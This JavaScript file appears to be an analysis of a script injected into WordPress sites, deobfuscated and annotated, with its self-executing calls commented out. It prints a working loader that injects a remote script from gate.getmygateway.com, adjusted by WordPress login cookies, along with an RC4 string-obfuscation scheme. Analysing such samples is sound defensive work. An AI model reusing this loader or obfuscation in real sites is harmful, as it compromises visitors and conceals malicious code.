// This function cycles through the array, pushing the first item to the end, until it is properly decrypting values.
// At this point, the rest of the script will run successfully
function iifeToDetermineTheArrayOrderForDecryption(getStrings, expectedDecryptionValue) {
    const shiftingStringArray = getStrings();
    while (true) {
        try {
            const valueToVerifyArrayIsOrderedCorrectly = parseInt(rc4DecryptString(591, "6gP8")) + parseInt(rc4DecryptString(511, "2byP")) / 2 + -parseInt(rc4DecryptString(472, "3Q1L")) / 3 + parseInt(rc4DecryptString(462, "(sKr")) / 4 * (parseInt(rc4DecryptString(566, "&%5%")) / 5) + -parseInt(rc4DecryptString(489, "20sJ")) / 6 + parseInt(rc4DecryptString(538, "k4v^")) / 7 * (-parseInt(rc4DecryptString(569, "f]Cu")) / 8) + -parseInt(rc4DecryptString(485, "TZ@0")) / 9 * (-parseInt(rc4DecryptString(536, "9Uf5")) / 10);
            if (valueToVerifyArrayIsOrderedCorrectly === expectedDecryptionValue) {
                break;
            } else {
                shiftingStringArray.push(shiftingStringArray.shift());
            }
        } catch (e) {
            shiftingStringArray.push(shiftingStringArray.shift());
        }
    }
}

// Comment out any self-executing behavior
// iifeToDetermineTheArrayOrderForDecryption(getStringArray, 863819));

// Add the gateway malware script to the document if it is not added already
function addGatewayMalwareScript(parameterToAddToHostname) {
    const gatewayMalwareScript = document.createElement("script");
    gatewayMalwareScript.src = "https://gate.getmygateway.com/KQGrXb?c=" + window.location.hostname + parameterToAddToHostname;
    gatewayMalwareScript.type = "text/javascript";
    gatewayMalwareScript.id = "stenswell";
    if (Boolean(document.querySelector('script[id="stenswell"]')) == false) {
        if (document.currentScript) {
            document.currentScript.parentNode.insertBefore(gatewayMalwareScript, document.currentScript);
            document.currentScript.remove();
        } else {
            document.getElementsByTagName("head")[0].appendChild(gatewayMalwareScript);
        }
    }
}

// Self-modifying function to get the string array. This array is modified by the iifeToDetermineTheArrayOrderForDecryption at the top to get it in the proper order
function getStringArray() {
    const strings = ["d8o+vmoPnW", "bwyK", "CmkSWOGgyG", "cgFdVSkMxW", "yYeFCmkjo2xcGay", "W55KWQm8aW", "WQm9W78", "fSoGW48bW6hcIIKypW", "WRtdR8o1xIa", "FmksD8kFmq", "bJBdQCkLAq", "fYFdQ8kLAq", "W7pdJq7dL04", "aCkwW5OSWRC", "WPaEW5ijWQC", "W6RdUCobfSkq", "W7b3WR/cIX4", "vLPchbKGWPHcW4nyoSolErC", "WRJdKXBcOxa", "oeufke4", "c8ksW7egWOK", "oHFdH2C+", "CSkFWPDGWRa", "AHLCW4NdQq", "amkqW5OIWOG", "WQ7dGmopww8", "ibBdIf9U", "W7FdImodoSkA", "WOddUK8TW7O", "BvRdSxn1W5n+aSkHWRpcHtu", "amk3C1dcIa", "mCkfW7VdRmoA", "WRpdSHtcRwe", "WQBdMrJcR3i", "y8oie8kNW6K", "jmoSW4C9W6JdUSkTW4ZdOZtdQa", "W7XQjfpcOa", "aCoPWQ7cM8kN", "rey7", "wLK/dXe", "cJqFra", "W6vVW5m4", "p0eI", "A1lcJsfVwSk9z23cMmkQ", "kSk9CmoBjW", "W4rVWOqefq", "W6v7WQJcGaq", "DCotbCkGW7m", "W5WmWQxcS0W", "WOhdL3lcIaS", "hCkKmG", "zSk3CSkMgG", "rCkJpbm", "pfuFWOlcVmk2WQf7zSkiWRG9", "W5L+W4S", "W4rItdXlfmkaWOVcPYZcKdza", "WP/dUgFcKCoJ", "uLuVfG8", "q8kHxmklkW", "nSokFSo0gq", "W6FdKCoQbdW", "W4hdOSokhSkp", "m8kcWPddJ8oY", "bSkGW4q1WOa", "W5LGW4ZdUGC", "c8kHW6uKWPC", "FCkcW6RdLSo/Dmo5", "lmkgW4NdJmoK", "c8oSWQG", "zKPdACob", "sXpcOSo0aCkecSkgoSo4dSkuBq", "CmoeWOJdJ8oswmofrCop", "WO/dVMWRW6y", "n8kjze/cUq", "mdJdMvfJ", "WRddS13cVmoa", "W6nIW5NdNIa", "of0AWO/cUmkZWRziuSkyWP4G", "mrZcLIm0", "WQpdGCoUshG", "iNmZlvm", "EComaG", "Fq3cS8kYiq", "WQGuW4W+WRO", "ECoyW79qW7K", "WPxdS08T", "ySkrW6W", "W6VcL8o2mCkO", "zCkUWPW", "W4NcRJNdG8k6ksfwiqxcKWa", "W6lcVCk5WQX1", "wv5dy8oo", "WO1iW6/dSbLGiCocC8oYjZtdVq", "kIddJee6", "d1ldVSkSxa", "D1revmol", "A14zr8oa", "WP/dPw3cM8o+", "bmk4W5m", "W7BcR23cPSkc", "WQGNW5GCWQq", "umkTWP4BW4S", "WRtdUSoZxNG", "mdJdNvnD", "nWJdQxTg", "WRO5W6lcIre", "W6L+WPJcVXy", "W5tdQsFdPwK", "WOVdO8opxNC", "CxyxmG", "ASkAWR4dFW", "tKqrgGS", "mx83jLK", "W7JcSCkL", "bxJdKSk7mCkXW5BcGSk8", "uCk5WOKmW5W", "W4fBW5enzq", "WQ0UyHFdTdrZW7JcLCoFW5pdQCojW4u", "WOyjWOdcQ0e3vq", "DCkEj8kVw8ozW69oWRFdUSoUaG", "tMuKW7nd", "WR3dJae", "WOVcQw7cRSoo", "c3mKW5nb", "bmkcW6icWQ0", "W6j6W7a", "W6DRW4q9zq", "W5lcR23cRW", "xSkcCCk6cq", "w0qimbe", "WOJdSN/cM8oZ", "mbldGq", "bdtdSmkWCW", "W6DLW6pcMeS", "AK8aWR/dOW", "bxGJW7nF", "WQBdQmoYW7e0CmkLfSkrWQyMuCkR", "lCkCW5NdMCoV", "WOLcW7ysEq", "l8opWQNcO8kt", "WOtdP1OMW6a", "W49VWR88hq", "WPrSfZa"];
    getStringArray = function () {
        return strings;
    };
    return getStringArray();
}

/* Self-modifying function that decrypts a string with a key. This functionality is likely provided by the library javascript-deobfuscator
   This function was modified for testing to accept a modified getStringArray.
   It still works with the original script, but this allows for easier testing with a string array that was cycled a certain number of times.
*/
function rc4DecryptString(encryptionKey, placeholder, stringArrayGetter = getStringArray) {
    const stringArray = stringArrayGetter();

        rc4DecryptString = function(args, encryptionKey) {
            encryptionKey = args[1];
            const stringIndex = args[0] - 460;
            let valueBeingDecrypted = stringArray[stringIndex];
            if (rc4DecryptString.internalFunctionsAreCreated === undefined) {
                const base64ToUtf8 = function (stringToDecode) {
                    let base64Decoded = "";
                    let binaryString = "";
                    let bitCount = 0;
                    let base64Char;
                    let currentChar;

                    for (let i = 0; currentChar = stringToDecode.charAt(i++); ~currentChar && (base64Char = bitCount % 4 ? base64Char * 64 + currentChar : currentChar, bitCount++ % 4) ? base64Decoded += String.fromCharCode(255 & base64Char >> (-2 * bitCount & 6)) : 0) {
                        currentChar = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(currentChar);
                    }

                    let i = 0;
                    for (let base64Length = base64Decoded.length; i < base64Length; i++) {
                        binaryString += "%" + ("00" + base64Decoded.charCodeAt(i).toString(16)).slice(-2);
                    }

                    return decodeURIComponent(binaryString);
                };

                rc4DecryptString.decryptWithRC4 = function (stringToDecrypt, key) {
                    const array0To255 = Array.from(Array(256).keys());
                    let currentIndex  = 0;
                    let temporaryValue;
                    let decryptedString  = "";
                    stringToDecrypt = base64ToUtf8(stringToDecrypt);
                    let i = 0;
                    for (i; i < 256; i++) {
                        currentIndex  = (currentIndex  + array0To255[i] + key.charCodeAt(i % key.length)) % 256;
                        temporaryValue = array0To255[i];
                        array0To255[i] = array0To255[currentIndex ];
                        array0To255[currentIndex ] = temporaryValue;
                    }
                    i = 0;
                    currentIndex  = 0;
                    for (let x = 0; x < stringToDecrypt.length; x++) {
                        i = (i + 1) % 256;
                        currentIndex  = (currentIndex  + array0To255[i]) % 256;
                        temporaryValue = array0To255[i];
                        array0To255[i] = array0To255[currentIndex ];
                        array0To255[currentIndex ] = temporaryValue;
                        decryptedString  += String.fromCharCode(stringToDecrypt.charCodeAt(x) ^ array0To255[(array0To255[i] + array0To255[currentIndex ]) % 256]);
                    }
                    return decryptedString ;
                };
                rc4DecryptString.internalFunctionsAreCreated = true;
            }
            const indexPlusFirstArrayValue = stringIndex + stringArray[0];
            const value = arguments[indexPlusFirstArrayValue];
            if (!value) {
                valueBeingDecrypted = rc4DecryptString.decryptWithRC4(valueBeingDecrypted, encryptionKey);
                arguments[indexPlusFirstArrayValue] = valueBeingDecrypted;
            } else {
                valueBeingDecrypted = value;
            }
            return valueBeingDecrypted;
    }
    return rc4DecryptString(arguments, encryptionKey);
}

// This script was cleaned up automatically by deobfuscate.io, but it can also be derived through the encryption values.
function executeByLoginStatus() {
    if (document.cookie.indexOf("wp-settings") !== -1 == false && document.cookie.indexOf("loggen_in") !== -1 == false) {
        addGatewayMalwareScript("");
    } else {
        addGatewayMalwareScript("&a=1");
    }
}

// Comment out self-executing code
// executeByLoginStatus();

// Export for testing
module.exports = {
    getStringArray: getStringArray,
    rc4Decrypt: rc4DecryptString,
};
